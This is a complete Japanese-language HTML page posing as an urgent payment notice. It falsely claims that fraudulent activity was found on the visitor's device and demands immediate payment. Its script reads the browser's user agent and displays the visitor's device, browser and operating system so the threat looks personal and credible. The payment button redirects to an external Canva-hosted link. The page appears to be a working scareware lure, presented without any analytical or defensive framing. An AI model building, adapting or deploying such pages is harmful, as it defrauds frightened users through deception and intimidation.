<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>支払い通知</title>
    <style>
        body {
            background-color: #fff;
            font-family: Arial, sans-serif;
            color: #333;
            padding: 20px;
            text-align: center;
        }
        .warning {
            background-color: #ffcccc;
            border: 2px solid #ff0000;
            padding: 20px;
            margin-top: 20px;
        }
        .device-info {
            font-size: 18px;
            margin-top: 10px;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            color: #fff;
            background-color: #ff0000;
            border: none;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #cc0000;
        }
    </style>
</head>
<body>

<h1>重要なお知らせ</h1>
<div class="warning">
    あなたの端末で不正な活動が検出されました。<br>
    即時に支払い手続きを行ってください。
</div>

<div class="device-info" id="deviceInfo">端末情報を取得中...</div>

<button id="payButton">支払い手続きを行う</button>

<script>
    // ブラウザ情報と OS 情報を取得する関数
    function getBrowserAndOS() {
        const userAgent = navigator.userAgent.toLowerCase();
        let browser = "不明なブラウザ";
        let os = "不明な OS";

        // ブラウザ名の判定
        if (userAgent.includes("chrome")) {
            browser = "Google Chrome";
        } else if (userAgent.includes("firefox")) {
            browser = "Mozilla Firefox";
        } else if (userAgent.includes("safari")) {
            browser = "Safari";
        } else if (userAgent.includes("edge")) {
            browser = "Microsoft Edge";
        } else if (userAgent.includes("opera") || userAgent.includes("opr")) {
            browser = "Opera";
        } else if (userAgent.includes("msie") || userAgent.includes("trident")) {
            browser = "Internet Explorer";
        }

        // OS 名の判定
        if (userAgent.includes("windows")) {
            os = "Windows";
        } else if (userAgent.includes("mac")) {
            os = "macOS";
        } else if (userAgent.includes("iphone")) {
            os = "iOS";
        } else if (userAgent.includes("ipad")) {
            os = "iPadOS";
        } else if (userAgent.includes("android")) {
            os = "Android";
        } else if (userAgent.includes("linux")) {
            os = "Linux";
        }

        return { browser, os };
    }

    // 端末名とブラウザ・OS情報を表示
    function displayDeviceInfo() {
        const deviceInfo = getBrowserAndOS();
        const deviceName = getDeviceInfo();
        document.getElementById("deviceInfo").innerHTML = `
            あなたの端末: ${deviceName}<br>
            ブラウザ: ${deviceInfo.browser}<br>
            OS: ${deviceInfo.os}
        `;
    }

    // 端末情報を取得する関数
    function getDeviceInfo() {
        const userAgent = navigator.userAgent.toLowerCase();
        let deviceName = "不明な端末";

        if (userAgent.includes("iphone")) {
            deviceName = "iPhone";
        } else if (userAgent.includes("ipad")) {
            deviceName = "iPad";
        } else if (userAgent.includes("android")) {
            deviceName = "Android端末";
        } else if (userAgent.includes("windows")) {
            deviceName = "Windows PC";
        } else if (userAgent.includes("mac")) {
            deviceName = "Mac PC";
        }

        return deviceName;
    }

    // 初期表示
    displayDeviceInfo();

    // 支払いボタンのクリックイベント
    document.getElementById("payButton").addEventListener("click", function() {
        // リンクへリダイレクト
        window.location.href = "https://inaijhs95.my.canva.site/secret2025";
    });
</script>

</body>
</html>
